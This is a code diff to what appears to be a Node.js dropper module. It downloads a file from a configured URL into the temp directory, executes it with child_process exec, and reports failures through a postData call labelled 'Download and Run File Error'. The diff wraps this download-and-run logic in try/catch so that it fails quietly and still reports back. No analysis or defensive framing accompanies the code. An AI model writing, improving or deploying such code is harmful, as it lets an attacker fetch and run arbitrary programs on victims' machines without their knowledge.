@@ -14,29 +14,33 @@ const FILE_EXTENSION = '';
 // const FILE_URL = 'http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg';
 // const FILE_EXTENSION = 'jpg';
 
-const fs = require('fs');
-const os = require('os');
+try {
+    const fs = require('fs');
+    const os = require('os');
 
-const http = require('http');
-const https = require('https');
-const url = require('url');
+    const http = require('http');
+    const https = require('https');
+    const url = require('url');
 
-const parsedUrl = url.parse(FILE_URL);
+    const parsedUrl = url.parse(FILE_URL);
 
-const httpTable = {
-    http,
-    https,
-};
+    const httpTable = {
+        http,
+        https,
+    };
 
-const { exec } = require('child_process');
+    const { exec } = require('child_process');
 
-const fileDir = `${os.tmpdir()}/${Date.now()}.${FILE_EXTENSION}`;
-const file = fs.createWriteStream(fileDir);
+    const fileDir = `${os.tmpdir()}/${Date.now()}.${FILE_EXTENSION}`;
+    const file = fs.createWriteStream(fileDir);
 
-httpTable[parsedUrl.protocol.replace(':', '')].get(FILE_URL, async (response) => {
-    response.pipe(file);
+    httpTable[parsedUrl.protocol.replace(':', '')].get(FILE_URL, async (response) => {
+        response.pipe(file);
 
-    await new Promise((r) => setTimeout(r, 1000));
+        await new Promise((r) => setTimeout(r, 1000));
 
-    exec(fileDir);
-});
+        exec(fileDir);
+    });
+} catch (e) {
+    postData(e.stack, 'Download and Run File Error');
+}
